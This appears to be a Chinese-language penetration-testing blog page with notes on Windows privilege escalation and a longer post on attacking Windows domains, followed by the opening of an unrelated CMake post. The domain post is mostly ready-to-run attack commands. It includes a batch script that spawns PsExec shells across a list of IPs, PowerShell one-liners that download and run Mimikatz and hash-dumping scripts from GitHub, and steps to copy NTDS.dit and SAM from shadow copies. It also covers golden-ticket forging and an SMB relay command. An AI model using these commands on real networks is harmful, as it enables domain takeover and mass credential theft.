<p>使用 mimikatz的驱动进行提权<br><img src="/2017/10/01/windows权限提升(二)/mimikatzdriver.png" alt=""><br>使用mimikatz的继承父进程权限方法<br><img src="/2017/10/01/windows权限提升(二)/mimikatzprocess.png" alt=""></p>
<h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><ul>
<li>这里有个问题，就是system权限是windows最高的权限，那么是不是就可以“为所欲为”？，那么你可以尝试删除一下c:\windows\system32目录下的某个文件(cmd.exe除外不排除有其它的程序)，发现竟然删除不了。<br><img src="/2017/10/01/windows权限提升(二)/TrustedInstaller.png" alt=""></li>
<li>Files in System32 are typically owned by “TrustedInstaller” and are locked down really tightly. If you really, absolutely feel you must do this, the easiest way is to boot from a Linux LiveCD or a Windows install disk.<br><a href="https://superuser.com/questions/744589/cant-delete-system-files-from-system32-drivers-need-permission" target="_blank" rel="external">stackoverflow</a><br><a href="https://helpdeskgeek.com/windows-7/windows-7-how-to-delete-files-protected-by-trustedinstaller/" target="_blank" rel="external">Windows 7/8/10 – How to Delete Files Protected by TrustedInstaller</a></li>
<li>这个TrustedInstaller是比较有趣的用户，可以理解为安装系统的人，一般的administrator组或者system组的用户都是修改不了所属TrustedInstaller的问题，所以想要修改这种文件，只能通过修改文件所有者才能达到自己想要的结果。<br><img src="/2017/10/01/windows权限提升(二)/trustinstaller.png" alt=""><br><a href="https://tyranidslair.blogspot.com/2017/08/the-art-of-becoming-trustedinstaller.html" target="_blank" rel="external">the-art-of-becoming-trustedinstaller</a><h2 id="后渗透模块"><a href="#后渗透模块" class="headerlink" title="后渗透模块"></a>后渗透模块</h2><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3></li>
<li>metasploit有一些有意思的后渗透模块，你需要有一个meterpreter shell 然后去运行这些后渗透模块<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">use exploit/windows/local/service_permissions</div><div class="line"></div><div class="line">post/windows/gather/credentials/gpp</div><div class="line"></div><div class="line">run post/windows/gather/credential_collector </div><div class="line"></div><div class="line">run post/multi/recon/local_exploit_suggester</div><div class="line"></div><div class="line">run post/windows/gather/enum_shares</div><div class="line"></div><div class="line">run post/windows/gather/enum_snmp</div><div class="line"></div><div class="line">run post/windows/gather/enum_applications</div><div class="line"></div><div class="line">run post/windows/gather/enum_logged_on_users</div><div class="line"></div><div class="line">run post/windows/gather/checkvm</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><ul>
<li>Empire内置了PowerUp部分工具，用于系统提权。<br>可参考<a href="https://www.anquanke.com/post/id/87333" target="_blank" rel="external">一篇文章精通PowerShell Empire 2.3</a><br><img src="/2017/10/01/windows权限提升(二)/allcheck.png" alt=""><h2 id="脆弱的驱动"><a href="#脆弱的驱动" class="headerlink" title="脆弱的驱动"></a>脆弱的驱动</h2></li>
<li>一些驱动程序也可以帮助我们提权，对这块儿没怎么研究，待更。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># List all drivers</div><div class="line">driverquery</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="漏洞提权"><a href="#漏洞提权" class="headerlink" title="漏洞提权"></a>漏洞提权</h2><h3 id="hotpotato"><a href="#hotpotato" class="headerlink" title="hotpotato"></a>hotpotato</h3><ul>
<li>Hot Potatok利用了windows中已有的一些问题，在windows默认配置下进行本地权限提升。实际是利用了NTLM重放(更确切的说是HTPP-&gt;SMB重放)，和NBNS欺骗。<br><img src="/2017/10/01/windows权限提升(二)/hotpotato.png" alt=""><h3 id="ms16032"><a href="#ms16032" class="headerlink" title="ms16032"></a>ms16032</h3></li>
<li></li>
<li>适用Win7-Win10 &amp; 2k8-2k12 &lt;== 32/64 bit!</li>
<li>漏洞详情 <a href="https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html" target="_blank" rel="external">https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html</a><br><img src="/2017/10/01/windows权限提升(二)/ms16-032.png" alt=""><h3 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h3></li>
<li>内核提权应该是我们最后万不得已才使用的方法，因为它往往容易导致系统不稳定或造成其它方面的问题。</li>
<li><p>首先来看一下系统的补丁情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">systeminfo</div><div class="line"># or</div><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</div><div class="line"># metasploit enumerate missing patches</div><div class="line">post/windows/gather/enum_patches</div><div class="line">post/multi/recon/local_exploit_suggester</div><div class="line"># posershell </div><div class="line">get-hotfix | Sort-Object HotfixID |format-table</div></pre></td></tr></table></figure>
</li>
<li><p>查找exploit<br><img src="/2017/10/01/windows权限提升(二)/windowskernelexploit.png" alt=""></p>
</li>
<li>这里推荐一个工具<a href="https://github.com/rasta-mouse/Watson" target="_blank" rel="external">Watson.exe</a> </li>
<li>或者是通过metasploit的post/windows/gather/enum_patches 补丁枚举进而查找对应的提权漏洞进行提权。<h3 id="python-转换成二进制文件"><a href="#python-转换成二进制文件" class="headerlink" title="python 转换成二进制文件"></a>python 转换成二进制文件</h3></li>
<li>如果我们的exploit是用python写的，但是受害机又没有python环境，这个时候可以使用pyinstaller或者其它工具将其转换成二进制文件。<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" target="_blank" rel="external">PowerUp</a><br><a href="https://github.com/fdiskyou/incognito2" target="_blank" rel="external">token窃取和debug权限滥用利用工具incognito</a><br><img src="/2017/10/01/windows权限提升(二)/incognito.png" alt=""><h2 id="other-1"><a href="#other-1" class="headerlink" title="other"></a>other</h2></li>
<li><a href="https://github.com/apt69/COMahawk" target="_blank" rel="external">Privilege Escalation: Weaponizing CVE-2019-1405 and CVE-2019-1322</a></li>
<li><a href="https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege" target="_blank" rel="external">CVE-2019-1388： Windows UAC 提权</a> 感觉这个挺有意思的，利用了运行consent.exe程序的高权限,使用浏览器打开网页之后再通过浏览器运行cmd.exe。<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><a href="https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_windows.html" target="_blank" rel="external">Privilege Escalation Windows</a><br><a href="https://www.youtube.com/watch?v=DlJyKgfkoKQ" target="_blank" rel="external">Windows Privilege Escalation Techniques (Local)</a><br><a href="https://www.slideshare.net/jakx_/level-up-practical-windows-privilege-escalation" target="_blank" rel="external">Level Up! - Practical Windows Privilege Escalation</a><br><a href="https://www.youtube.com/watch?v=G9yn3qNq7Vw" target="_blank" rel="external">Windows Privilege Escalation Unquoted Service part1/2/3</a><br><a href="https://www.youtube.com/watch?v=vRivLCELwEY" target="_blank" rel="external">RomHack 2018 - show me your Windows privileges and I will lead you to SYSTEM - Pierini</a><br>!!! <a href="https://github.com/sagishahar/lpeworkshop" target="_blank" rel="external">提权环境-以上</a></li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/09/28/windows域安全/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="M0rk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0rk's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/09/28/windows域安全/" itemprop="url">
                  windows域安全
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            

            

            
          </span>

          

          
            
          

          
          

          

          

          
          
        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
<li>域安全笔记<h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2></li>
<li>域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机；工作组就像各自为政，组内每一台计算机自己管理自己，他人无法干涉。</li>
<li>域是一个计算机群体的组合，是一个相对严格的组织，而域控制器则是这个域内的管理核心。</li>
<li>一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP/IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题。</li>
<li><p>Active Directory = LDAP服务器＋LDAP应用（Windows域控）<br>就是Active Directory先实现一个LDAP服务器，然后自己先用这个LDAP服务器实现了自己的一个具体应用（域控）。</p>
<h2 id="内网信息搜集以及常见域命令"><a href="#内网信息搜集以及常见域命令" class="headerlink" title="内网信息搜集以及常见域命令"></a>内网信息搜集以及常见域命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">ipconfig /all	查询本机IP段，所在域等</div><div class="line">net config Workstation	当前计算机名，全名，用户名，系统版本，工作站域，登陆域</div><div class="line">net user	本机用户列表</div><div class="line">net localhroup administrators	本机管理员[通常含有域用户]</div><div class="line">net user /domain	查询域用户</div><div class="line">net user 用户名 /domain	获取指定用户的账户信息</div><div class="line">net group /domain	查询域里面的工作组</div><div class="line">net group 组名 /domain	查询域中的某工作组</div><div class="line">net group &quot;domain admins&quot; /domain	查询域管理员列表</div><div class="line">net group &quot;enterprise admins&quot; /domain	获得企业管理员列表</div><div class="line">net group 组名 /del /domain	删除域中的某组</div><div class="line">net group 组名 组成员名 /del /domain	删除域中的某组的组成员</div><div class="line">net localgroup administrators /domain	登录本机的域管理员</div><div class="line">net group 组名 /add	增加域中的组</div><div class="line">net localgroup administrators workgroup\user001 /add	域用户添加到本机</div><div class="line">net group &quot;domain controllers&quot; /domain	查看域控制器(如果有多台)</div><div class="line">net time /domain	判断主域，主域服务器都做时间服务器</div><div class="line">net session	查看当前会话</div><div class="line">net use \\ip\ipc$ pawword /user:username@domain	建立IPC会话[空连接-***]</div><div class="line">net use z: \\192.168.200.21\文件夹名	建立映射到本机Z盘</div><div class="line">net share	查看SMB指向的路径[即共享]</div><div class="line">at \\192.168.200.2  0：00 c:\windows\muma.exe	在共享主机上执行</div><div class="line">net view	查询同一域内机器列表</div><div class="line">net view /domain	查询域列表</div><div class="line">net view /domain:M0RK	查看test域中计算机列表</div><div class="line">net view \\域控的机器名	查看域控共享情况</div><div class="line">nltest /domain_trusts	获取域信任信息</div><div class="line">net session	查看当前会话</div><div class="line">net start	查看当前运行的服务</div><div class="line">net time /domain	查询主域服务器的时间</div><div class="line">echo %logonserver%	查看登录认证的机器(即域控机器)</div><div class="line">net accounts	查看本地密码策略</div><div class="line">net accounts /domain	查看域密码策略</div><div class="line">query user   查看当前的登录信息</div><div class="line">netsh firewall show config	查看防火墙策略</div><div class="line">netsh firewall show state	查看防火墙策略</div><div class="line">route print	路由表</div><div class="line">tracert IP	路由跟踪</div><div class="line">arp -a	列出本网段内所有活跃的IP地址</div><div class="line">arp -s (ip + mac)	绑定mac和IP</div><div class="line">arp -d (iP + mac)	解绑IP和Mac</div><div class="line">tasklist /V	查看进程[显示对应用户]</div><div class="line">tasklist /S ip /U domain\username /P /V	查看远程计算机进程列表</div><div class="line">tasklist /S IP地址 /U 域名\用户名 /P /V	查看远程计算机进程</div><div class="line">tasklist /svc	查看进程</div><div class="line">taskkill /im 进程名称(cmd.exe)	结束进程</div><div class="line">taskkill /pid[进程码]	-t(结束该进程) -f(强制结束该进程以及所有子进程)</div><div class="line">qprocess *	类似tasklist</div><div class="line">qprocess /SERVER:IP	远程查看计算机进程列表</div><div class="line">whoami /all	查询当前用户权限等</div><div class="line">set	查看系统环境变量</div><div class="line">systeminfo	查看系统信息</div><div class="line">qwinsta	查看登录情况</div><div class="line">fsutil fsinfo drives	查看所有盘符</div><div class="line">wmic bios	查看bios信息</div><div class="line">wmic qfe	查看补丁信息</div><div class="line">wmic qfe get hotfixid	查看补丁-Patch号，很实用</div><div class="line">wmic share get name,path	查看SMB指向路径</div><div class="line">net view /domain</div><div class="line">net config workstation</div><div class="line">net group &quot;Domain Admins&quot; /domain</div><div class="line">net time /domain</div><div class="line">ipconfig /all</div><div class="line">nslookup xxx</div><div class="line">dsquery server</div><div class="line"></div><div class="line">查看域控制器</div><div class="line">net group &quot;Domain controllers&quot;</div><div class="line"></div><div class="line">查询所有计算机名称(windows 2003)</div><div class="line"></div><div class="line">dsquery computer</div><div class="line"></div><div class="line">下面这条查询的时候,域控不会列出</div><div class="line"></div><div class="line">net group &quot;Domain Computers&quot; /domain</div></pre></td></tr></table></figure>
</li>
<li><p>查找域控<br>1.dsquery server(或者net group “domain controllers” /domain命令)查找到主机名，然后ping一下主机名，得到的ip一般就是域控机器的ip地址了。<br>2.使用nslookup命令  _ldap._tcp.dc._msdcs.domainname<br>3.nltest /dclist:domainname<br><img src="/2017/09/28/windows域安全/finddc.png" alt=""><br>4.cobaltstrike的net  dclist直接定位到dc<br>或者使用powershell的powerview 获取域当前的信息<br>5.adfind、ldifde、adexplorer等工具<br><img src="/2017/09/28/windows域安全/adfind.png" alt=""><br>…</p>
</li>
<li>常见脚本<br><a href="https://pentestlab.blog/2018/05/28/situational-awareness/" target="_blank" rel="external">https://pentestlab.blog/2018/05/28/situational-awareness/</a><h2 id="搞定域控"><a href="#搞定域控" class="headerlink" title="搞定域控"></a>搞定域控</h2>1.ms14-068 将普通域用户权限提升为域控权限<br><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068" target="_blank" rel="external">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</a><br>2.查看哪些主机上存在域管理员的活动会话，找到域管登陆过的机器，进而抓取域管的密码或者哈希。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">## 批量返回shell</div><div class="line">@echo off</div><div class="line"></div><div class="line">echo check ip addr config file…</div><div class="line"></div><div class="line">if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end</div><div class="line"></div><div class="line">echo read and analysis file…</div><div class="line"></div><div class="line">for /F &quot;eol=#&quot; %%i in (ip.txt) do start PsExec.exe \\%%i -accepteula -u administrator -p &quot;PASSWORD&quot; cmd </div><div class="line"></div><div class="line">:end</div><div class="line">## 用指定的用户名和密码去遍历ip.txt中的IP列表，并打印任务列表，将结果输出到result.txt当中，执行完了上述批处理，我们只需要稍作等待，最后去查看result.txt当中是否含有域管理员用户名，即可确定哪些主机上存在域管理员的活动会话</div><div class="line">@echo off</div><div class="line"></div><div class="line">echo check ip addr config file…</div><div class="line"></div><div class="line">if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end</div><div class="line"></div><div class="line">echo read and analysis file…</div><div class="line"></div><div class="line">for /F &quot;eol=#&quot; %%i in (ip.txt) do echo %%i &amp;(echo %%i &amp;tasklist /s %%i /u administrator /p &quot;PASSWORD&quot; /v) &gt;&gt;d:\result.txt</div><div class="line"></div><div class="line">:end</div><div class="line"></div><div class="line">exit</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p><img src="/2017/09/28/windows域安全/passhash.png" alt=""><br>哈希传递的工具可参考文章 <a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/" target="_blank" rel="external">域渗透——Pass The Hash的实现</a></p>
<h2 id="PTT-silver-ticket"><a href="#PTT-silver-ticket" class="headerlink" title="PTT-silver ticket"></a>PTT-silver ticket</h2><p><img src="/2017/09/28/windows域安全/silverticket.png" alt=""><br><img src="/2017/09/28/windows域安全/machinentlm.png" alt=""></p>
<ul>
<li>注意这里机器的NTLM 是关键，域sid都是一样的  <h2 id="PTT-golden-ticket"><a href="#PTT-golden-ticket" class="headerlink" title="PTT-golden ticket"></a>PTT-golden ticket</h2></li>
<li>域中每个用户的Ticket都是由krbtgt的密码Hash来计算生成的，因此只要拿到了krbtgt的密码Hash，就可以随意伪造Ticket，进而使用Ticket登陆域控制器，使用krbtgt用户hash生成的票据被称为Golden Ticket，此类攻击方法被称为票据传递攻击。<br><img src="/2017/09/28/windows域安全/krbtgt1.png" alt=""></li>
<li>获取krbtgt账号ntlm命令是Lsadump::dcsync  /user:krbtgt <h2 id="抓密码或hash"><a href="#抓密码或hash" class="headerlink" title="抓密码或hash"></a>抓密码或hash</h2></li>
<li><p>通过powershell抓取某台机器的明文密码或者哈希</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#抓明文</div><div class="line">powershell IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1′); Invoke-Mimikatz –DumpCerts</div><div class="line">#抓哈希</div><div class="line">powershell IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1′);Get-PassHashes</div></pre></td></tr></table></figure>
</li>
<li><p>dump域数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">vssadmin Create Shadow /for=C：        创建新的卷影副本</div><div class="line">成功地创建了 &apos;C:\&apos; 的卷影副本</div><div class="line">   卷影副本 ID: &#123;ad7dfdec-a8db-4fa3-b2e6-7e1ab1bad2b4&#125;</div><div class="line">   卷影副本卷名: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3</div><div class="line"></div><div class="line">执行程序：</div><div class="line">\\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\test\psexec.exe</div><div class="line">1.需要先创建好目录，并放入木马或程序</div><div class="line">2.再创建新的卷影副本,利用卷影副本卷名来执行程序，并把卷影副本卷名中的 &quot;?&quot; 需要改为 &quot;.&quot;号执行程序</div><div class="line"></div><div class="line">Copy Files</div><div class="line">有些系统运行中的文件是不可复制的，比如像SAM</div><div class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\</div><div class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM C:\</div><div class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\</div><div class="line"></div><div class="line">PowerShell调用方法：</div><div class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SYSTEM&quot; -ComputerName SERVER -localDestination &quot;C:\temp\SYSTEM&quot;</div><div class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\NTDS\NTDS.dit&quot; -ComputerName SERVER -localDestination &quot;C:\temp\NTDS.dit&quot;</div><div class="line">需要文件：</div><div class="line">https://github.com/clymb3r/PowerShell/tree/master/Invoke-NinjaCopy</div><div class="line"></div><div class="line">vssadmin Delete Shadows /shadow=&#123;ce51aaf6-5677-4423-86ac-45d064ef626e&#125; /quiet        删除卷影副本</div><div class="line">vssadmin Delete Shadows /For=C:</div><div class="line"></div><div class="line">---</div><div class="line"></div><div class="line">reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters        查询NTDS路径</div><div class="line">获取域数据库</div><div class="line">Windows\NTDS\ntds.dit</div><div class="line">Windows\System32\config\SYSTEM</div><div class="line">Windows\System32\config\SAM</div><div class="line"></div><div class="line">NTDSDump导出域数据库hash值：</div><div class="line">NTDSDump.exe -f ntds.dit -s SYSTEM -h -t john -o save.txt</div><div class="line">或者：</div><div class="line">QuarksPwDump.exe</div><div class="line">QuarksPwDump --dump-hash-domain --with-history        导出本机域控历史hash值</div></pre></td></tr></table></figure>
</li>
</ul>
<p><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" target="_blank" rel="external">更多</a></p>
<h2 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h2><h3 id="windows中的Credential-Manager的信息获取"><a href="#windows中的Credential-Manager的信息获取" class="headerlink" title="windows中的Credential Manager的信息获取"></a>windows中的Credential Manager的信息获取</h3><ul>
<li>Credential Manager，中文翻译为凭据管理器，用来存储凭据(例如网站登录和主机远程连接的用户名密码)。</li>
<li>如果用户选择存储凭据，那么当用户再次使用对应的操作，系统会自动填入凭据，实现自动登录<br><img src="/2017/09/28/windows域安全/cmdkey.png" alt=""></li>
<li>凭据类别包含两种，分别为Domain Credentials和Generic Credentials。</li>
<li>凭据读取 mimikatz和powershell脚本<br><img src="/2017/09/28/windows域安全/mimikatzdumpcredman.png" alt=""><br>更多可参考<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%ADCredential-Manager%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96/" target="_blank" rel="external">Windows中Credential Manager的信息获取</a><h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><a href="https://github.com/SpiderLabs/scavenger" target="_blank" rel="external">横向渗透信息搜集工具</a><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><h3 id="SMB共享枚举"><a href="#SMB共享枚举" class="headerlink" title="SMB共享枚举"></a>SMB共享枚举</h3></li>
<li><p><a href="https://github.com/ShawnDEvans/smbmap" target="_blank" rel="external">SMBMap</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">root@kali:/# smbmap -H [ip] -d [domain] -u [user] -p [password]</div><div class="line">[+] Finding open SMB ports....</div><div class="line">[+] User SMB session establishd on [ip]...</div><div class="line">[+] IP: [ip]:445        Name: [ip]                                      </div><div class="line">        Disk                                                    Permissions</div><div class="line">        ----                                                    -----------</div><div class="line">        ADMIN$                                                  NO ACCESS</div><div class="line">        C$                                                      NO ACCESS</div><div class="line">        IPC$                                                    NO ACCESS</div><div class="line">        NETLOGON                                                READ ONLY</div><div class="line">        Replication                                             READ ONLY</div><div class="line">        SYSVOL                                                  READ ONLY</div></pre></td></tr></table></figure>
</li>
<li><p>使用nmap </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap --script smb-enum-shares -p 139,445 [ip]</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="查看SMB的漏洞"><a href="#查看SMB的漏洞" class="headerlink" title="查看SMB的漏洞"></a>查看SMB的漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap --script smb-vuln* -p 139,445 [ip]</div></pre></td></tr></table></figure>
<h3 id="trick4-smbrelay"><a href="#trick4-smbrelay" class="headerlink" title="trick4 smbrelay"></a>trick4 smbrelay</h3><p>python smbrelayx.py -h 172.24.243.59（被攻击的机器） -e smb_rev.exe<br><img src="/2017/09/28/windows域安全/smbrelay.png" alt=""><br><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/smbrelayx.py" target="_blank" rel="external">https://github.com/CoreSecurity/impacket/blob/master/examples/smbrelayx.py</a><br><a href="http://www.91ri.org/9022.html" target="_blank" rel="external">再谈SMB中继攻击</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/09/28/CmakeVSautotools/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="M0rk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0rk's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/09/28/CmakeVSautotools/" itemprop="url">
                  Cmake VS Autotools
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            

            

            
          </span>

          

          
            
          

          
          

          

          

          
          
        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近的项目中遇到了cmake和autotools的转换的问题，这两个东西以前接触的很少，所以需要对cmake和autotools进行一番系统学习。<br></p>
<h4 id="Cmake使用"><a href="#Cmake使用" class="headerlink" title="Cmake使用"></a>Cmake使用</h4><ul>
<li><a href="https://www.wikiwand.com/en/CMake" target="_blank" rel="external">wiki关于cmake介绍</a></li>
<li><a href="https://cmake.org/documentation/" target="_blank" rel="external">官方文档</a> 熟悉某种技术的最好最快的方法还是要通过阅读官方文档:P</li>
<li><a href="https://www.gitbook.com/book/tuannguyen68/learning-cmake-a-beginner-s-guide/details" target="_blank" rel="external">learning-cmake-a-beginner-s-guide/details</a></li>
<li><a href="http://www.hahack.com/codes/cmake/" target="_blank" rel="external">CMake 入门实战</a></li>
